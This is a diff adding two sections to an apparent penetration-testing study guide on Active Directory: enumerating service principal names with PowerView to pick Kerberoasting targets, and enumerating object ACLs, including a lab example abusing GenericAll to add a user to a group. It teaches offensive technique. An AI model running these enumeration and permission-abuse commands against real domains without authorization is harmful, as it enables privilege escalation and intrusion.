@@ -1280,3 +1280,453 @@ Get-NetSession -ComputerName <target> -Verbose
 This enumeration provides the foundation for credential theft attacks and lateral movement planning by revealing where valuable user sessions exist and which systems offer administrative access.
 
 ---
+
+## Enumeration Through Service Principal Names
+
+Service Principal Names (SPNs) are unique identifiers for services running on servers in Active Directory. They enable Kerberos authentication to specific services and reveal valuable information about the network infrastructure, service accounts, and potential attack vectors.
+
+### SPN Structure and Purpose
+
+**SPN Format:**
+```
+service_class/host:port/service_name
+```
+
+**Common Service Classes:**
+- **HTTP**: Web applications, SharePoint
+- **MSSQL**: SQL Server instances
+- **CIFS**: File sharing services
+- **LDAP**: Directory services
+- **HOST**: Generic host services
+- **TERMSRV**: Terminal Services/RDP
+
+**Why SPNs Matter for Attackers:**
+- Reveal running services and their locations
+- Identify service accounts (often privileged)
+- Enable Kerberoasting attacks
+- Map network infrastructure and service topology
+
+### SPN Enumeration with PowerView
+
+**Basic SPN Discovery:**
+```powershell
+# All SPNs in the domain
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+
+# Computer object SPNs
+Get-NetComputer | select dnshostname,serviceprincipalname
+```
+
+**Service-Specific Enumeration:**
+```powershell
+# SQL Server instances
+Get-NetUser -SPN | where {$_.serviceprincipalname -like "*MSSQL*"}
+
+# Web applications
+Get-NetUser -SPN | where {$_.serviceprincipalname -like "*HTTP*"}
+
+# File shares
+Get-NetComputer | where {$_.serviceprincipalname -like "*CIFS*"}
+```
+
+**High-Value Service Account Discovery:**
+```powershell
+# Service accounts (users with SPNs)
+Get-NetUser -SPN | select samaccountname,serviceprincipalname,memberof
+
+# Privileged service accounts
+Get-NetUser -SPN | where {$_.memberof -like "*admin*"}
+```
+
+### SPN Analysis Examples
+
+**SQL Server Discovery:**
+```powershell
+Get-NetUser -SPN | where {$_.serviceprincipalname -like "*MSSQL*"} | select samaccountname,serviceprincipalname
+```
+*Sample Output:*
+```
+samaccountname serviceprincipalname
+-------------- --------------------
+sqlservice     {MSSQLSVC/db01.corp.com:1433, MSSQLSVC/db01.corp.com}
+```
+
+**Web Application Enumeration:**
+```powershell
+Get-NetUser -SPN | where {$_.serviceprincipalname -like "*HTTP*"} | select samaccountname,serviceprincipalname
+```
+*Sample Output:*
+```
+samaccountname serviceprincipalname
+-------------- --------------------
+iis_service    {HTTP/web04.corp.com, HTTP/web04}
+```
+
+**Service Account Privilege Analysis:**
+```powershell
+Get-NetUser -SPN | select samaccountname,memberof,serviceprincipalname | fl
+```
+
+### SPN-Based Infrastructure Mapping
+
+**Network Service Discovery:**
+```powershell
+# Map all services by host
+Get-NetComputer | select dnshostname,@{Name="Services";Expression={($_.serviceprincipalname -split " ") -join ", "}}
+
+# Database infrastructure
+Get-NetUser -SPN | where {$_.serviceprincipalname -match "MSSQL|MYSQL|ORACLE"} | select samaccountname,serviceprincipalname
+
+# Web infrastructure  
+Get-NetUser -SPN | where {$_.serviceprincipalname -match "HTTP|HTTPS"} | select samaccountname,serviceprincipalname
+```
+
+### Kerberoasting Target Identification
+
+**Identify Kerberoastable Accounts:**
+```powershell
+# Service accounts with SPNs (Kerberoasting targets)
+Get-NetUser -SPN | where {$_.samaccounttype -eq "USER_OBJECT"} | select samaccountname,serviceprincipalname
+
+# Exclude computer accounts (focus on user service accounts)
+Get-NetUser -SPN | where {$_.samaccountname -notlike "*$"} | select samaccountname,serviceprincipalname
+
+# High-privilege Kerberoasting targets
+Get-NetUser -SPN | where {$_.admincount -eq 1} | select samaccountname,serviceprincipalname,memberof
+```
+
+### SPN Enumeration Workflow
+
+```mermaid
+flowchart TD
+    Start["SPN Enumeration"] --> Discovery["Get-NetUser -SPN"]
+    Discovery --> Analysis["Service Analysis"]
+    
+    Analysis --> SQL["SQL Services<br/>(MSSQL SPNs)"]
+    Analysis --> Web["Web Services<br/>(HTTP SPNs)"]
+    Analysis --> File["File Services<br/>(CIFS SPNs)"]
+    Analysis --> Other["Other Services<br/>(LDAP, TERMSRV)"]
+    
+    SQL --> SQLTargets["Database Servers<br/>Service Accounts"]
+    Web --> WebTargets["Web Applications<br/>IIS Services"]
+    File --> FileTargets["File Servers<br/>Share Access"]
+    Other --> OtherTargets["Domain Controllers<br/>Terminal Servers"]
+    
+    SQLTargets --> Kerberoast["Kerberoasting<br/>Opportunities"]
+    WebTargets --> WebAttack["Web Application<br/>Attacks"]
+    FileTargets --> ShareEnum["Share Enumeration<br/>Data Access"]
+    OtherTargets --> Lateral["Lateral Movement<br/>Service Exploitation"]
+    
+    style Start fill:#e1f5fe
+    style Kerberoast fill:#ff6b6b
+    style WebAttack fill:#fff3e0
+    style ShareEnum fill:#e8f5e8
+```
+
+### Service Account Strategic Analysis
+
+**Service Account Characteristics:**
+- Often have elevated privileges for service functionality
+- May have "Log on as a service" rights
+- Frequently exempt from password policies
+- Can have local admin rights on multiple servers
+
+**Attack Vectors:**
+1. **Kerberoasting**: Extract service account password hashes
+2. **Service Exploitation**: Target vulnerable services directly
+3. **Privilege Escalation**: Leverage service account permissions
+4. **Lateral Movement**: Use service context for network access
+
+### SPN Enumeration Commands Reference
+
+**Discovery Commands:**
+```powershell
+# All service accounts
+Get-NetUser -SPN
+
+# Service accounts with details
+Get-NetUser -SPN | select samaccountname,serviceprincipalname,memberof,lastlogon
+
+# Computer SPNs
+Get-NetComputer | select dnshostname,serviceprincipalname
+
+# SPN by service type
+Get-NetUser -SPN | where {$_.serviceprincipalname -like "*<SERVICE>*"}
+```
+
+**Analysis Commands:**
+```powershell
+# Administrative service accounts
+Get-NetUser -SPN | where {$_.admincount -eq 1}
+
+# Recently active service accounts
+Get-NetUser -SPN | where {$_.lastlogon -gt (Get-Date).AddDays(-30)}
+
+# Service accounts by group membership
+Get-NetUser -SPN | where {$_.memberof -match "admin|operator|backup"}
+```
+
+### Common SPN Patterns and Targets
+
+**High-Value SPNs:**
+- **MSSQLSVC**: Database servers (often privileged access)
+- **HTTP**: Web applications (potential for web shells)
+- **CIFS**: File servers (data access opportunities)
+- **LDAP**: Domain controllers (authentication services)
+
+**Service Account Naming Patterns:**
+- **svc_**: Service account prefix
+- **sql**: Database service accounts
+- **iis**: Web service accounts
+- **backup**: Backup service accounts (often highly privileged)
+
+### Key Insights from SPN Enumeration
+
+**Infrastructure Mapping:**
+- Service distribution across hosts
+- Technology stack identification
+- Network service dependencies
+- Administrative service locations
+
+**Attack Surface Analysis:**
+- Kerberoasting target prioritization
+- Service exploitation opportunities
+- Privilege escalation paths through service accounts
+- Lateral movement via service context
+
+SPN enumeration provides critical intelligence for understanding service infrastructure, identifying privileged service accounts, and planning targeted attacks against specific services and their associated credentials.
+
+---
+
+## Enumerating Object Permissions
+
+Active Directory object permissions control access through Access Control Lists (ACLs) containing Access Control Entries (ACEs). Understanding and enumerating these permissions reveals privilege escalation opportunities and misconfigurations that attackers can exploit.
+
+### ACL/ACE Structure and Validation
+
+**Access Control Components:**
+- **ACL (Access Control List)**: Collection of permissions for an object
+- **ACE (Access Control Entry)**: Individual permission rule (allow/deny)
+- **Access Token**: User identity and permissions sent during access attempts
+- **Validation Process**: Target object checks token against ACL
+
+**Access Validation Flow:**
+1. User sends access token to target object
+2. Object validates token against its ACL
+3. ACL allows or denies access based on ACE rules
+
+### Critical Permission Types for Attackers
+
+**High-Impact Permissions:**
+- **GenericAll**: Full permissions on object (complete control)
+- **GenericWrite**: Edit certain attributes on the object
+- **WriteOwner**: Change ownership of the object
+- **WriteDACL**: Edit ACEs applied to object (modify permissions)
+- **AllExtendedRights**: Change password, reset password, etc.
+- **ForceChangePassword**: Password change for object
+- **Self (Self-Membership)**: Add ourselves to groups
+
+### Object ACL Enumeration with PowerView
+
+**Basic ACL Enumeration:**
+```powershell
+# Enumerate ACEs for specific object
+Get-ObjectAcl -Identity <object_name>
+
+# Focus on specific permissions
+Get-ObjectAcl -Identity <object_name> | where {$_.ActiveDirectoryRights -eq "GenericAll"}
+
+# Clean output format
+Get-ObjectAcl -Identity <object_name> | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+**Key Properties for Analysis:**
+- **ObjectSID**: Target object's Security Identifier
+- **SecurityIdentifier**: Principal with the permission (who has access)
+- **ActiveDirectoryRights**: Type of permission granted
+
+### SID to Name Conversion
+
+**Converting SIDs to Readable Names:**
+```powershell
+# Single SID conversion
+Convert-SidToName <SID>
+
+# Multiple SID conversion
+"<SID1>","<SID2>","<SID3>" | Convert-SidToName
+```
+
+*Example:*
+```powershell
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+# Output: CORP\stephanie
+```
+
+### Practical Permission Enumeration Examples
+
+**Personal User ACL Analysis:**
+```powershell
+Get-ObjectAcl -Identity stephanie | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+**Group Permission Discovery:**
+```powershell
+# Check GenericAll permissions on Management Department
+Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+```
+
+*Sample Output:*
+```
+SecurityIdentifier                            ActiveDirectoryRights
+------------------                            ---------------------
+S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
+S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
+S-1-5-32-548                                             GenericAll
+```
+
+**SID Resolution:**
+```powershell
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548" | Convert-SidToName
+```
+*Output:*
+```
+CORP\Domain Admins
+CORP\stephanie
+BUILTIN\Account Operators
+```
+
+### Exploiting Misconfigured Permissions
+
+**GenericAll Abuse Example:**
+```powershell
+# Add user to group (requires GenericAll on group)
+net group "Management Department" stephanie /add /domain
+
+# Verify membership
+Get-NetGroup "Management Department" | select member
+
+# Cleanup (remove from group)
+net group "Management Department" stephanie /del /domain
+```
+
+### Systematic Permission Enumeration
+
+**Domain-Wide Permission Discovery:**
+```powershell
+# All objects with GenericAll permissions
+Get-ObjectAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select ObjectDN,SecurityIdentifier
+
+# WriteDACL permissions (can modify ACLs)
+Get-ObjectAcl | ? {$_.ActiveDirectoryRights -eq "WriteDACL"} | select ObjectDN,SecurityIdentifier
+
+# AllExtendedRights (password changes)
+Get-ObjectAcl | ? {$_.ActiveDirectoryRights -eq "AllExtendedRights"} | select ObjectDN,SecurityIdentifier
+```
+
+**Group-Focused Enumeration:**
+```powershell
+# Check permissions on high-value groups
+$groups = @("Domain Admins","Enterprise Admins","Schema Admins")
+foreach($group in $groups) {
+    Get-ObjectAcl -Identity $group | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
+}
+```
+
+### Permission Enumeration Workflow
+
+```mermaid
+flowchart TD
+    Start["Object Permission Enum"] --> Target["Select Target Object"]
+    Target --> Enumerate["Get-ObjectAcl -Identity"]
+    Enumerate --> Filter["Filter by Permission Type"]
+    
+    Filter --> GenericAll["GenericAll<br/>(Full Control)"]
+    Filter --> WriteDACL["WriteDACL<br/>(Modify Permissions)"]
+    Filter --> WriteOwner["WriteOwner<br/>(Change Ownership)"]
+    Filter --> ExtendedRights["AllExtendedRights<br/>(Password Change)"]
+    
+    GenericAll --> SIDConvert["Convert-SidToName"]
+    WriteDACL --> SIDConvert
+    WriteOwner --> SIDConvert
+    ExtendedRights --> SIDConvert
+    
+    SIDConvert --> Analysis["Analyze Principals"]
+    Analysis --> Exploit["Exploit Permissions"]
+    
+    Exploit --> GroupAdd["Add to Groups"]
+    Exploit --> PasswordChange["Change Passwords"]
+    Exploit --> OwnershipChange["Modify Ownership"]
+    
+    style Start fill:#e1f5fe
+    style GenericAll fill:#ff6b6b
+    style Exploit fill:#fff3e0
+```
+
+### Strategic Permission Analysis
+
+**Identifying Misconfigurations:**
+- Regular users with GenericAll on groups/OUs
+- Service accounts with excessive permissions
+- Cross-domain permission inheritance issues
+- Orphaned permissions from deleted objects
+
+**Attack Vectors by Permission:**
+1. **GenericAll**: Complete object control, group membership manipulation
+2. **WriteDACL**: Permission modification, backdoor creation
+3. **WriteOwner**: Ownership takeover, permission inheritance
+4. **AllExtendedRights**: Password changes, account manipulation
+5. **ForceChangePassword**: Direct credential compromise
+
+### Permission Enumeration Commands Reference
+
+**Basic Enumeration:**
+```powershell
+# Target-specific ACL enumeration
+Get-ObjectAcl -Identity "<target>"
+
+# Permission-filtered enumeration
+Get-ObjectAcl -Identity "<target>" | ? {$_.ActiveDirectoryRights -eq "<permission>"}
+
+# Clean output format
+Get-ObjectAcl -Identity "<target>" | select SecurityIdentifier,ActiveDirectoryRights,ObjectDN
+```
+
+**Advanced Analysis:**
+```powershell
+# Multiple permission types
+Get-ObjectAcl -Identity "<target>" | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}
+
+# Non-standard permissions (potential misconfigurations)
+Get-ObjectAcl -Identity "<target>" | ? {$_.SecurityIdentifier -notmatch "S-1-5-32|S-1-5-18|S-1-5-19"}
+```
+
+### Well-Known SIDs Reference
+
+**Common System SIDs:**
+- **S-1-5-18**: Local System
+- **S-1-5-19**: Local Service
+- **S-1-5-20**: Network Service
+- **S-1-5-32-544**: BUILTIN\Administrators
+- **S-1-5-32-548**: BUILTIN\Account Operators
+
+**Domain-Specific SIDs (pattern):**
+- **-512**: Domain Admins
+- **-513**: Domain Users
+- **-515**: Domain Computers
+- **-519**: Enterprise Admins
+
+### Key Insights from Permission Enumeration
+
+**Security Implications:**
+- Misconfigured permissions often provide privilege escalation paths
+- Regular users with administrative permissions indicate policy violations
+- Permission inheritance can create unintended access
+
+**Attack Planning:**
+- GenericAll permissions enable group membership manipulation
+- WriteDACL allows permission backdoor creation
+- AllExtendedRights enables credential attacks
+
+Object permission enumeration reveals critical security misconfigurations and provides direct paths for privilege escalation through ACL abuse and permission manipulation.
+
+---
